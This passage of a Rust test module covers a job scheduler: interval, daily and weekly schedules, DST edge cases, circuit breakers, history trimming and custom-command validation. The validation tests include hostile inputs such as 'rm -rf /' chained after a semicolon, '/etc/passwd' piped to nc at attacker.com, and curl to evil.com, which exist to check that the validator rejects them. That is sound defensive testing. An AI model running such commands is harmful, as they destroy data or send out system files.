    }

    #[test]
    fn test_schedule_validate_interval_at_minimum() {
        let s = Schedule::IntervalSecs(MIN_INTERVAL_SECS);
        assert!(s.validate().is_ok());
    }

    #[test]
    fn test_register_rejects_invalid_interval() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(10));
        assert!(
            !sched.register(def),
            "should reject schedule with interval < MIN_INTERVAL_SECS"
        );
        assert!(sched.jobs.is_empty());
    }

    #[test]
    fn test_register_rejects_too_frequent_custom_job() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(
            JobKind::Custom("nightly-export".to_string()),
            Schedule::IntervalSecs(MIN_CUSTOM_JOB_INTERVAL_SECS - 1),
        );
        assert!(!sched.register(def));
    }

    #[test]
    fn test_register_accepts_custom_job_at_min_interval() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(
            JobKind::Custom("nightly-export".to_string()),
            Schedule::IntervalSecs(MIN_CUSTOM_JOB_INTERVAL_SECS),
        );
        assert!(sched.register(def));
    }

    // ── B234: hour/minute range validation ──────────────

    #[test]
    fn test_schedule_validate_daily_bad_hour() {
        let s = Schedule::DailyAt {
            hour: 24,
            minute: 0,
        };
        let e = s.validate().unwrap_err();
        assert!(e.contains("hour") && e.contains("out of range"), "{}", e);
    }

    #[test]
    fn test_schedule_validate_daily_bad_minute() {
        let s = Schedule::DailyAt {
            hour: 12,
            minute: 60,
        };
        let e = s.validate().unwrap_err();
        assert!(e.contains("minute") && e.contains("out of range"), "{}", e);
    }

    #[test]
    fn test_schedule_validate_weekly_bad_hour() {
        let s = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 25,
            minute: 0,
        };
        assert!(s.validate().is_err());
    }

    #[test]
    fn test_schedule_validate_weekly_bad_minute() {
        let s = Schedule::WeeklyOn {
            day: IsoWeekday::Tue,
            hour: 0,
            minute: 99,
        };
        assert!(s.validate().is_err());
    }

    #[test]
    fn test_schedule_validate_daily_valid() {
        assert!(Schedule::DailyAt {
            hour: 23,
            minute: 59
        }
        .validate()
        .is_ok());
        assert!(Schedule::DailyAt { hour: 0, minute: 0 }.validate().is_ok());
    }

    #[test]
    fn test_daily_schedule_midnight_boundary_due_after_midnight() {
        let sched = Schedule::DailyAt { hour: 0, minute: 0 };
        let last_run = Some(utc(2026, 2, 22, 0, 1, 0));
        let now = utc(2026, 2, 23, 0, 0, 30);
        assert!(is_due(&sched, last_run, now));
    }

    #[test]
    fn test_daily_schedule_midnight_not_due_same_day_after_run() {
        let sched = Schedule::DailyAt { hour: 0, minute: 0 };
        let last_run = Some(utc(2026, 2, 23, 0, 5, 0));
        let now = utc(2026, 2, 23, 23, 59, 0);
        assert!(!is_due(&sched, last_run, now));
    }

    // ── B235: weekly schedule UTC stability around DST dates ────────

    #[test]
    fn test_weekly_schedule_unaffected_by_us_dst_spring_forward() {
        // US clocks spring forward on 2026-03-08 (Sunday) at 02:00 local.
        // Our schedules are UTC-only — no DST adjustment should occur.
        // Monday 2026-03-09 06:00 UTC should still be recognised as due.
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 3, 9, 7, 0, 0); // Monday after US spring-forward
        assert!(is_due(&sched, None, now));
        // Confirm it also fires on the previous Monday (before DST) the same way
        let before_dst = utc(2026, 3, 2, 7, 0, 0);
        assert!(is_due(&sched, None, before_dst));
    }

    #[test]
    fn test_weekly_schedule_unaffected_by_eu_dst_end() {
        // EU clocks fall back on 2026-10-25 (Sunday).
        // Monday 2026-10-26 06:00 UTC must still fire.
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 10, 26, 7, 0, 0);
        assert!(is_due(&sched, None, now));
    }

    // ── B236: circuit breaker reset audit logging ────────

    #[test]
    fn test_circuit_breaker_reset_re_enables_and_clears_failures() {
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def.max_consecutive_failures = 2;
        // Trip the breaker
        for _ in 0..2 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            run.fail("err");
            def.record_run(&run);
        }
        assert!(def.is_circuit_broken());
        // Operator resets via explicit call
        def.reset_circuit_breaker();
        assert!(!def.is_circuit_broken());
        assert!(def.enabled);
        assert_eq!(def.consecutive_failures, 0);
    }

    // ── B237: per-job timeout field ────────

    #[test]
    fn test_job_def_with_timeout() {
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_timeout(7200);
        assert_eq!(def.timeout_secs, Some(7200));
    }

    #[test]
    fn test_job_def_default_no_timeout() {
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        assert_eq!(def.timeout_secs, None);
    }

    #[test]
    fn test_default_scheduler_jobs_have_timeouts() {
        let s = default_scheduler();
        for (key, def) in &s.jobs {
            assert!(
                def.timeout_secs.is_some(),
                "job {:?} should have a timeout configured",
                key
            );
        }
    }

    // ── B238: overlap guard ──────────────

    #[test]
    fn test_due_jobs_skips_running_job() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        // Simulate a job whose last status is Running (in-flight)
        def.last_status = Some(JobStatus::Running);
        def.last_run = Some(utc(2026, 2, 23, 8, 0, 0));
        sched.jobs.insert("crawl_cycle".to_string(), def);

        let due = sched.due_jobs(utc(2026, 2, 23, 10, 0, 0));
        assert!(
            due.is_empty(),
            "Running job should not be included in due_jobs"
        );
    }

    #[test]
    fn test_due_jobs_allows_succeeded_job_after_interval() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        def.last_status = Some(JobStatus::Succeeded { duration_ms: 100 });
        def.last_run = Some(utc(2026, 2, 23, 8, 0, 0));
        sched.jobs.insert("crawl_cycle".to_string(), def);

        let due = sched.due_jobs(utc(2026, 2, 23, 10, 0, 0)); // well past interval
        assert_eq!(due.len(), 1);
    }

    // ── B240: due job selection with multiple schedule types ────────

    #[test]
    fn test_due_jobs_multiple_schedule_types_at_same_time() {
        let mut sched = Scheduler::new();

        // Interval job that ran 2h ago
        let mut def_interval = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def_interval.last_run = Some(utc(2026, 2, 23, 8, 0, 0));
        sched.jobs.insert("crawl_cycle".to_string(), def_interval);

        // Daily job at 10:00 that hasn't run today
        let mut def_daily = JobDef::new(
            JobKind::PatternMining,
            Schedule::DailyAt {
                hour: 10,
                minute: 0,
            },
        );
        def_daily.last_run = Some(utc(2026, 2, 22, 10, 5, 0)); // yesterday
        sched.jobs.insert("pattern_mining".to_string(), def_daily);

        // Weekly on Monday at 10:00 that hasn't run this week
        let mut def_weekly = JobDef::new(
            JobKind::PromotionBoard,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 10,
                minute: 0,
            },
        );
        def_weekly.last_run = Some(utc(2026, 2, 16, 10, 5, 0)); // last Monday
        sched.jobs.insert("promotion_board".to_string(), def_weekly);

        // Now = Monday 2026-02-23 10:30 UTC
        let now = utc(2026, 2, 23, 10, 30, 0);
        let due = sched.due_jobs(now);
        assert_eq!(
            due.len(),
            3,
            "all three schedule types should be due: {:?}",
            due
        );
    }

    #[test]
    fn test_due_jobs_mixed_only_some_due() {
        let mut sched = Scheduler::new();

        // Interval job that ran just 10 min ago — NOT due
        let mut def_interval = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def_interval.last_run = Some(utc(2026, 2, 23, 9, 50, 0));
        sched.jobs.insert("crawl_cycle".to_string(), def_interval);

        // Daily job at 10:00 that hasn't run today — DUE
        let mut def_daily = JobDef::new(
            JobKind::PatternMining,
            Schedule::DailyAt {
                hour: 10,
                minute: 0,
            },
        );
        def_daily.last_run = Some(utc(2026, 2, 22, 10, 0, 0));
        sched.jobs.insert("pattern_mining".to_string(), def_daily);

        let now = utc(2026, 2, 23, 10, 30, 0);
        let due = sched.due_jobs(now);
        assert_eq!(due.len(), 1);
        assert!(due.contains(&JobKind::PatternMining));
    }

    // ── B242: max_concurrent field ────────

    #[test]
    fn test_job_def_max_concurrent_default_is_one() {
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        assert_eq!(def.max_concurrent, 1);
    }

    #[test]
    fn test_job_def_with_max_concurrent() {
        let def =
            JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_max_concurrent(4);
        assert_eq!(def.max_concurrent, 4);
    }

    #[test]
    fn test_job_def_with_max_concurrent_zero_clamps_to_one() {
        let def =
            JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600)).with_max_concurrent(0);
        assert_eq!(def.max_concurrent, 1, "max_concurrent must never be 0");
    }

    // ── B243: disabled jobs ────────

    #[test]
    fn test_due_jobs_all_disabled_returns_empty() {
        let mut sched = Scheduler::new();
        for kind in [
            JobKind::CrawlCycle,
            JobKind::PatternMining,
            JobKind::PoiRefresh,
        ] {
            let mut def = JobDef::new(kind, Schedule::IntervalSecs(60));
            def.enabled = false;
            let key = def.kind.as_str().to_string();
            sched.jobs.insert(key, def);
        }
        assert!(sched.due_jobs(Utc::now()).is_empty());
    }

    #[test]
    fn test_disabled_job_does_not_fire_even_when_overdue() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        def.last_run = Some(utc(2020, 1, 1, 0, 0, 0)); // massively overdue
        def.enabled = false;
        sched.jobs.insert("crawl_cycle".to_string(), def);
        let due = sched.due_jobs(utc(2026, 2, 23, 10, 0, 0));
        assert!(due.is_empty());
    }

    #[test]
    fn test_circuit_breaker_disables_and_then_schedule_skips_it() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        sched.register(def);
        // Trip circuit breaker
        let def_mut = sched.jobs.get_mut("crawl_cycle").unwrap();
        def_mut.max_consecutive_failures = 1;
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        run.fail("fatal");
        sched.record_run(run);
        // Now it should be disabled
        assert!(!sched.jobs["crawl_cycle"].enabled);
        let due = sched.due_jobs(Utc::now());
        assert!(due.is_empty(), "circuit-broken job must not be scheduled");
    }

    // ── B250: custom command validation ────────

    #[test]
    fn test_validate_custom_command_ok() {
        let result = validate_custom_command(
            "my_export",
            "run_export --quiet",
            &["run_export", "python3"],
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_custom_command_empty_name() {
        assert!(validate_custom_command("", "echo hi", &["echo"]).is_err());
    }

    #[test]
    fn test_validate_custom_command_bad_name_chars() {
        let e = validate_custom_command("my job!", "echo hi", &["echo"]).unwrap_err();
        assert!(e.contains("disallowed characters"));
    }

    #[test]
    fn test_validate_custom_command_shell_injection() {
        // Semicolon injection must be rejected
        let e = validate_custom_command("job", "echo hi; rm -rf /", &["echo"]).unwrap_err();
        assert!(e.contains("forbidden metacharacter"), "{}", e);
    }

    #[test]
    fn test_validate_custom_command_pipe_injection() {
        let e = validate_custom_command("job", "cat /etc/passwd | nc attacker.com 80", &["cat"])
            .unwrap_err();
        assert!(e.contains("forbidden metacharacter"));
    }

    #[test]
    fn test_validate_custom_command_not_in_allowlist() {
        let e = validate_custom_command("job", "curl https://evil.com", &["python3", "run_export"])
            .unwrap_err();
        assert!(e.contains("not in allowlist"), "{}", e);
    }

    #[test]
    fn test_validate_custom_command_empty_allowlist_skips_check() {
        // Empty allowlist means no binary restriction
        let result = validate_custom_command("job", "anything --flag", &[]);
        assert!(result.is_ok());
    }

    // ── B296: backpressure tests ──

    #[test]
    fn test_scheduler_history_trimming_enforces_max() {
        // Verify that history never grows beyond max_history
        let mut sched = Scheduler::new();
        sched.max_history = 10;

        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        def.enabled = true;
        sched.register(def);

        // Record 20 runs
        for i in 0..20 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.run_id = format!("run-{i}");
            run.succeed(100 + i, &format!("processed batch {i}"));
            sched.record_run(run);
        }

        // History should be trimmed to max_history
        assert_eq!(
            sched.history.len(),
            10,
            "history must be trimmed to max_history limit"
        );
        // Oldest runs (0-9) should have been dropped, keeping 10-19
        assert_eq!(sched.history[0].run_id, "run-10");
        assert_eq!(sched.history[9].run_id, "run-19");
    }

    #[test]
    fn test_scheduler_history_trimming_drops_oldest_first() {
        let mut sched = Scheduler::new();
        sched.max_history = 5;

        let mut def = JobDef::new(
            JobKind::PatternMining,
            Schedule::DailyAt { hour: 2, minute: 0 },
        );
        def.enabled = true;
        sched.register(def);

        // Record runs with identifiable notes
        for i in 0..10 {
            let mut run = JobRun::new(JobKind::PatternMining);
            run.run_id = format!("mining-{i}");
            run.succeed(50, &format!("note-{i}"));
            sched.record_run(run);
        }

        assert_eq!(sched.history.len(), 5);
        // Should contain runs 5-9
        assert_eq!(sched.history[0].notes, "note-5");
        assert_eq!(sched.history[4].notes, "note-9");
    }

    #[test]
    fn test_scheduler_history_trimming_respects_configurable_limit() {
        let mut sched = Scheduler::new();
        sched.max_history = 100; // Custom limit

        let def = JobDef::new(
            JobKind::StrategyMemo,
            Schedule::WeeklyOn {
                day: IsoWeekday::Sun,
                hour: 3,
                minute: 0,
            },
        );
        sched.register(def);

        // Add 150 runs
        for i in 0..150 {
            let mut run = JobRun::new(JobKind::StrategyMemo);
            run.run_id = format!("w-{i}");
            run.fail(&format!("err-{i}"));
            sched.record_run(run);
        }

        assert_eq!(
            sched.history.len(),
            100,
            "history must respect custom max_history"
        );
        // Should have runs 50-149
        assert_eq!(sched.history.first().unwrap().run_id, "w-50");
        assert_eq!(sched.history.last().unwrap().run_id, "w-149");
    }

    #[test]
    fn test_scheduler_history_no_trim_when_below_limit() {
        let mut sched = Scheduler::new();
        sched.max_history = 1000; // Default

        let def = JobDef::new(JobKind::PoiRefresh, Schedule::IntervalSecs(300));
        sched.register(def);

        // Add only 10 runs
        for i in 0..10 {
            let mut run = JobRun::new(JobKind::PoiRefresh);
            run.run_id = format!("c-{i}");
            run.succeed(i * 10, "ok");
            sched.record_run(run);
        }

        // All 10 should be present, no trimming
        assert_eq!(sched.history.len(), 10);
        assert_eq!(sched.history[0].run_id, "c-0");
        assert_eq!(sched.history[9].run_id, "c-9");
    }

    #[test]
    fn test_scheduler_record_run_threaded_with_mutex() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        let scheduler = Arc::new(Mutex::new(Scheduler::new()));
        {
            let mut guard = scheduler.lock().unwrap();
            guard.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
        }

        let mut handles = Vec::new();
        for thread_id in 0..4 {
            let scheduler = Arc::clone(&scheduler);
            handles.push(thread::spawn(move || {
                for i in 0..25 {
                    let mut run = JobRun::new(JobKind::CrawlCycle);
                    run.run_id = format!("t{}-{}", thread_id, i);
                    run.succeed(1, "ok");
                    scheduler.lock().unwrap().record_run(run);
                }
            }));
        }
        for h in handles {
            h.join().unwrap();
        }

        let guard = scheduler.lock().unwrap();
        assert_eq!(guard.history.len(), 100);
    }

    #[test]
    fn test_due_jobs_when_last_run_missing_is_due() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        sched.register(def);

        let due = sched.due_jobs(utc(2026, 2, 23, 10, 0, 0));
        assert_eq!(due, vec![JobKind::CrawlCycle]);
    }

    #[test]
    fn test_due_jobs_across_day_boundary_daily_schedule() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(
            JobKind::PatternMining,
            Schedule::DailyAt { hour: 0, minute: 0 },
        );
        def.last_run = Some(utc(2026, 2, 22, 0, 5, 0));
        sched.jobs.insert("pattern_mining".to_string(), def);

        let due = sched.due_jobs(utc(2026, 2, 23, 0, 1, 0));
        assert!(due.contains(&JobKind::PatternMining));
    }

    #[test]
    fn test_due_jobs_across_week_boundary_weekly_schedule() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(
            JobKind::PromotionBoard,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 10,
                minute: 0,
            },
        );
        def.last_run = Some(utc(2026, 2, 16, 10, 5, 0));
        sched.jobs.insert("promotion_board".to_string(), def);

        let due = sched.due_jobs(utc(2026, 2, 23, 10, 10, 0));
        assert!(due.contains(&JobKind::PromotionBoard));
    }

    #[test]
    fn test_job_run_skip_sets_finished_and_duration_non_negative() {
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        run.skip("no data");
        assert!(matches!(run.status, JobStatus::Skipped { .. }));
        assert!(run.finished_at.is_some());
        let duration = run.duration_ms();
        assert!(duration <= u64::MAX);
    }

    #[test]
    fn test_job_run_fail_captures_notes() {
        let mut run = JobRun::new(JobKind::PatternMining);
        run.start();
        run.fail("upstream timeout");
        assert!(matches!(run.status, JobStatus::Failed { .. }));
        assert_eq!(run.notes, "upstream timeout");
    }

    #[test]
    fn test_interval_schedule_drift_under_load() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        sched.register(def);

        let mut now = utc(2026, 2, 23, 10, 0, 0);
        // Simulate 20 ticks with irregular loop delay and ensure schedule catches up
        // (fires whenever elapsed >= interval despite drift).
        let mut fired = 0usize;
        for delay in [
            20, 25, 80, 10, 90, 55, 70, 15, 120, 40, 35, 75, 10, 65, 85, 30, 95, 50, 60, 45,
        ] {
            now += chrono::Duration::seconds(delay);
            if sched.due_jobs(now).contains(&JobKind::CrawlCycle) {
                let mut run = JobRun::new(JobKind::CrawlCycle);
                run.started_at = now;
                run.status = JobStatus::Succeeded { duration_ms: 0 };
                run.finished_at = Some(now);
                run.items_processed = 1;
                run.notes = "tick".to_string();
                sched.record_run(run);
                fired += 1;
            }
        }
        assert!(
            fired >= 8,
            "expected regular firing despite drift, got {fired}"
        );
    }
}
